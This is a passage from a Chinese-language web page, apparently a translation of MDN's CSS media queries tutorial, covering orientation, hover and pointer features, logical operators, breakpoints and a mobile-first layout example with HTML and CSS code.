title="朝向"></a>朝向</h4><p>一个受到良好支持的媒体特征是<code>orientation</code>，我们可以用它测得竖放（portrait mode）和横放（landscape mode）模式。要在设备处于横向的时候改变 body 文本颜色的话，可使用下面的媒体查询。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">orientation</span>: landscape) &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">color</span>: rebeccapurple;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中<a href="https://mdn.github.io/css-examples/learn/media-queries/orientation.html">打开此示例</a>，或者<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/orientation.html">查看源代码</a>。</p><p>标准的桌面视图是横放朝向的，在这种朝向上能够表现良好的设计，在处于竖放模式的手机或平板电脑上可能不会表现得这么好。对朝向的测试可以帮你建立一个为竖放设备优化的布局。</p><h4 id="使用指点设备"><a href="#使用指点设备" class="headerlink" title="使用指点设备"></a>使用指点设备</h4><p>作为四级规范的一部分，<code>hover</code>媒体特征被引入了进来。这种特征意味着你可以测试用户是否能在一个元素上悬浮，这也基本就是说他们正在使用某种指点设备，因为触摸屏和键盘导航是没法实现悬浮的。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">hover</span>: <span class="hljs-attribute">hover</span>) &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">color</span>: rebeccapurple;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中<a href="https://mdn.github.io/css-examples/learn/media-queries/hover.html">打开此示例</a>，或者<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/hover.html">查看源代码</a>。</p><p>如果我们知道用户不能悬浮的话，我们可以默认显示一些交互功能。对于能够悬浮的用户，我们可以选择在悬浮在链接上的时候，让这些功能可用。</p><p>还是在四级规范中，出现了<code>pointer</code>媒体特征。它可取三个值：<code>none</code>、<code>fine</code>和<code>coarse</code>。<code>fine</code>指针是类似于鼠标或者触控板的东西，它让用户可以精确指向一片小区域。<code>coarse</code>指针是你在触摸屏上的手指。<code>none</code>值意味着，用户没有指点设备，也许是他们正只使用键盘导航，或者是语音命令。</p><p>使用<code>pointer</code>可以在用户使用屏幕时进行交互时，帮你更好地设计响应这种交互的界面。例如，如果你知道用户正在用触摸屏设备交互的时候，你可以建立更大的响应区域。</p><h4 id="更复杂的媒体查询"><a href="#更复杂的媒体查询" class="headerlink" title="更复杂的媒体查询"></a>更复杂的媒体查询</h4><p>有了所有不同的可用的媒体查询，你可能想要把它们混合起来，或者建立查询列表——其中的任何一个都可以匹配生效。</p><h4 id="媒体查询中的“与”逻辑"><a href="#媒体查询中的“与”逻辑" class="headerlink" title="媒体查询中的“与”逻辑"></a>媒体查询中的“与”逻辑</h4><p>为了混合媒体特征，你可以以与在上面使用<code>and</code>很相同的方式，用<code>and</code>来混合媒体类型和特征。例如，我们可能会想要测得<code>min-width</code>和<code>orientation</code>，而 body 的文字只会在视口至少为 400 像素宽，且设备横放时变为蓝色。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">400px</span>) <span class="hljs-keyword">and</span> (<span class="hljs-attribute">orientation</span>: landscape) &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">color</span>: blue;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中<a href="https://mdn.github.io/css-examples/learn/media-queries/and.html">打开此示例</a>，或者<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/and.html">查看源代码</a>。</p><h4 id="媒体查询中的“或”逻辑"><a href="#媒体查询中的“或”逻辑" class="headerlink" title="媒体查询中的“或”逻辑"></a>媒体查询中的“或”逻辑</h4><p>如果你有一组查询，且要其中的任何一个都可以匹配的话，那么你可以使用逗号分开这些查询。在下面的示例中，文本会在视口至少为 400 像素宽的时候<strong>或者</strong>设备处于横放状态的时候变为蓝色。如果其中的任何一项成立，那么查询就匹配上了。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">@media <span class="hljs-keyword">screen </span><span class="hljs-keyword">and </span>(min-width: <span class="hljs-number">400</span>px), <span class="hljs-keyword">screen </span><span class="hljs-keyword">and </span>(<span class="hljs-keyword">orientation: </span>landscape) &#123;<br>    <span class="hljs-keyword">body </span>&#123;<br><span class="hljs-symbol">        color:</span> <span class="hljs-keyword">blue;</span><br><span class="hljs-keyword"></span>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中<a href="https://mdn.github.io/css-examples/learn/media-queries/or.html">打开此示例</a>，或者<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/or.html">查看源代码</a>。</p><h4 id="媒体查询中的“非”逻辑"><a href="#媒体查询中的“非”逻辑" class="headerlink" title="媒体查询中的“非”逻辑"></a>媒体查询中的“非”逻辑</h4><p>你可以用<code>not</code>操作符让整个媒体查询失效。这就直接反转了整个媒体查询的含义。因而在下面的例子中，文本只会在朝向为竖着的时候变成蓝色。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> <span class="hljs-keyword">not</span> all <span class="hljs-keyword">and</span> (<span class="hljs-attribute">orientation</span>: landscape) &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">color</span>: blue;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中<a href="https://mdn.github.io/css-examples/learn/media-queries/not.html">打开此示例</a>，或者<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/not.html">查看源代码</a>。</p><h4 id="怎么选择断点"><a href="#怎么选择断点" class="headerlink" title="怎么选择断点"></a>怎么选择断点</h4><p>响应式设计的早期，许多设计者会尝试指向非常特定的屏幕尺寸。人们公布了流行的手机和平板的屏幕尺寸列表，以让设计者创建可以整齐地放在那些视口里面的设计。</p><p>现在有多得多的设备，以及多种多样的尺寸，让这种事变得不再可行。这也就是说，将所有的设计用在特定的尺寸上以外，一个更好的方法是在内容某种程度上开始变得混乱的时候，改变尺寸的设计。也许线太长了，或者盒子状的外侧栏开始挤在一起而难以阅读。那就是你想要使用媒体查询，将设计变得对剩余可用空间更加友好的时候。这种方式意味着，它无关使用的设备的确切大小，每个范围都被照顾到了。引入媒体查询的点就叫做<strong>断点</strong>。</p><p>火狐开发者工具中的<a href="https://firefox-source-docs.mozilla.org/devtools-user/responsive_design_mode/index.html">响应式设计模式</a>能很好地帮助弄清楚断点应该设置在哪里。你能容易就能让视口变大和变小，然后看下可以在哪里加入媒体查询、调整设计，从而改善内容。</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Media_queries/rwd-mode.png" alt="A screenshot of a layout in a mobile view in Firefox DevTools."></p><h4 id="主动学习：移动优先的响应式设计"><a href="#主动学习：移动优先的响应式设计" class="headerlink" title="主动学习：移动优先的响应式设计"></a>主动学习：移动优先的响应式设计</h4><p>泛泛地说，你可以采用两种方式实现响应式设计。你可以从桌面或者最宽的视图开始，然后随着视口变得越来越小，加上断点，把物件挪开；你也可以从最小的视图开始，随着视口变得越来越大，增添布局内容。第二种方式被叫做<strong>移动优先</strong>的响应式设计，很多时候是最值得仿效的做法。</p><p>用在最小的那个设备上的视图很多时候都是一个简单的单列内容，很像正常文本流显示的那样。这意味着，你很可能不需要为小设备做多少布局设计，合适地安排下你的源代码，默认情况下你就可以得到可读的布局。</p><p>下面的教程会领你用一个非常简单的布局熟悉这种方式。在生产站点上，你的媒体查询中可能会有更多的东西需要调整，但是它们的方法是完全一样的。</p><h4 id="教程：一个简单的移动优先布局"><a href="#教程：一个简单的移动优先布局" class="headerlink" title="教程：一个简单的移动优先布局"></a>教程：一个简单的移动优先布局</h4><p>我们的起始点是一个 HTML 文档，上面应用了一些 CSS，为布局的各部分加入了背景颜色。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>    <span class="hljs-attribute">box-sizing</span>: border-box;<br>&#125;<br><br><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">90%</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">2em</span> auto;<br>    <span class="hljs-attribute">font</span>: <span class="hljs-number">1em</span>/<span class="hljs-number">1.3</span> Arial, Helvetica, sans-serif;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>,<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;<br>&#125;<br><br><span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">ul</span>,<br><span class="hljs-selector-tag">aside</span> <span class="hljs-selector-tag">ul</span> &#123;<br>    <span class="hljs-attribute">list-style</span>: none;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>,<br><span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">207</span>, <span class="hljs-number">232</span>, <span class="hljs-number">220</span>, <span class="hljs-number">0.2</span>);<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">79</span>, <span class="hljs-number">185</span>, <span class="hljs-number">227</span>);<br>    <span class="hljs-attribute">text-decoration</span>: none;<br>    <span class="hljs-attribute">display</span>: block;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;<br>    <span class="hljs-attribute">font-weight</span>: bold;<br>&#125;<br><br><span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">207</span>, <span class="hljs-number">232</span>, <span class="hljs-number">220</span>, <span class="hljs-number">0.7</span>);<br>&#125;<br><br><span class="hljs-selector-class">.related</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">79</span>, <span class="hljs-number">185</span>, <span class="hljs-number">227</span>, <span class="hljs-number">0.3</span>);<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">79</span>, <span class="hljs-number">185</span>, <span class="hljs-number">227</span>);<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.sidebar</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">207</span>, <span class="hljs-number">232</span>, <span class="hljs-number">220</span>, <span class="hljs-number">0.5</span>);<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">article</span> &#123;<br>    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">1em</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们没有改变过任何布局，但是文件的源代码是以让内容可读的方式排列的。这个开头是重要的，也是能够确保内容在由屏幕阅读器读出来的时候，让其可以理解的一步。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;wrapper&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>About<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>Contact<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>Meet the team<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>Blog<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Veggies!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>              ...<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">aside</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;related&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>              ...<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">aside</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sidebar&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>External vegetable-based links<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>              ...<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span><br><br>      <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-symbol">&amp;copy;</span>2019<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个简单的布局在移动端上也能表现得很好。如果我们在开发者工具中的响应式设计模式里面查看这个布局的话，我们可以看到，它作为一个直截了当的站点移动版布局来说，表现得相当优秀。</p><p>在浏览器里<a href="https://mdn.github.io/css-examples/learn/media-queries/step1.html">打开步骤一</a>，或者<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/step1.html">查看源代码</a>。</p><p><strong>如果你想要在我们继续的时候，按步骤来并尝试这个示例，在你的电脑上建立一个<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/step1.html">step1.html</a>的本地副本。</strong></p><p>从这里开始，脱拽响应式设计的窗口，让它变得变得更宽，直到你看到一行变得非常长，有足够空间把导航栏放在一个水平行里面。这是我们加入第一个媒体查询的地方。我们将会使用 em，因为这意味着，如果用户已经增加了文本的大小，断点会在行差不多也是这样长，但是视口更宽的时候产生；而文本更小的时候，视口也会更窄。</p><p><strong>将下面的代码加到你的 step1.html 的 CSS 底部。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">40em</span>) &#123;<br>    <span class="hljs-selector-tag">article</span> &#123;<br>        <span class="hljs-attribute">display</span>: grid;<br>        <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">3</span>fr <span class="hljs-number">1</span>fr;<br>        <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">20px</span>;<br>    &#125;<br><br>    <span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">ul</span> &#123;<br>        <span class="hljs-attribute">display</span>: flex;<br>    &#125;<br><br>    <span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">li</span> &#123;<br>        <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 CSS 让我们的文章里面有了个两列布局，两栏分别是文章的内容和在 aside 元素中相关的信息。我们也已经用弹性盒把导航栏放在了一行里面。</p><p>在浏览器中<a href="https://mdn.github.io/css-examples/learn/media-queries/step2.html">打开步骤二</a>，或者<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/step2.html">查看源代码</a>。</p><p>让我们继续增加宽度，直到我们觉得这里有了足够多的空间来放置侧栏，再形成一列。在媒体查询中，我们会让 main 元素变成两栏网格。我们之后需要移除文章上的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin-bottom"><code>margin-bottom</code></a>，让两个侧栏和彼此对齐，然后我们将会往页脚的顶部加上一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border"><code>border</code></a> 。一般来说，为了让设计看起来好看，这些小调整是你将会在每一个断点都需要做的。</p><p><strong>再往你的 step1.html 的 CSS 的底部加入下面的代码：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">70em</span>) &#123;<br>    <span class="hljs-selector-tag">main</span> &#123;<br>        <span class="hljs-attribute">display</span>: grid;<br>        <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">3</span>fr <span class="hljs-number">1</span>fr;<br>        <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">20px</span>;<br>    &#125;<br><br>    <span class="hljs-selector-tag">article</span> &#123;<br>        <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-selector-tag">footer</span> &#123;<br>        <span class="hljs-attribute">border-top</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;<br>        <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">2em</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中<a href="https://mdn.github.io/css-examples/learn/media-queries/step3.html">打开步骤三</a>，或者<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/step3.html">查看源代码</a>。</p><p>如果你在不同的宽度下，看下最后的示例，你会看到设计是如何响应的，在可用的宽度下是如何表现为单栏、双栏或者三栏的。这是一个移动优先的响应式设计的非常简单的示例。</p><h4 id="你真的需要媒体查询吗？"><a href="#你真的需要媒体查询吗？" class="headerlink" title="你真的需要媒体查询吗？"></a>你真的需要媒体查询吗？</h4><p>弹性盒、网格和多栏布局都给了你建立可伸缩的甚至是响应式组件的方式，而不需要媒体查询。这些布局方式能否在不加入媒体查询的时候实现你想要的设计，总是值得考虑的一件事。例如，你可能想要一组卡片，至少为二百像素宽，并在主文章里尽可能多地放下这些二百像素的卡片。这可以用网格布局实现，而完全不使用媒体查询。</p><p>这可以由以下代码实现：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;grid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Card 1<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Card 2<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Card 3<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Card 4<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Card 5<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.grid</span> &#123;<br>    <span class="hljs-attribute">list-style</span>: none;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">display</span>: grid;<br>    <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">200px</span>, <span class="hljs-number">1</span>fr));<br>&#125;<br><br><span class="hljs-selector-class">.grid</span> <span class="hljs-selector-tag">li</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#666</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中<a href="https://mdn.github.io/css-examples/learn/media-queries/grid.html">打开网格布局示例</a>，或者<a 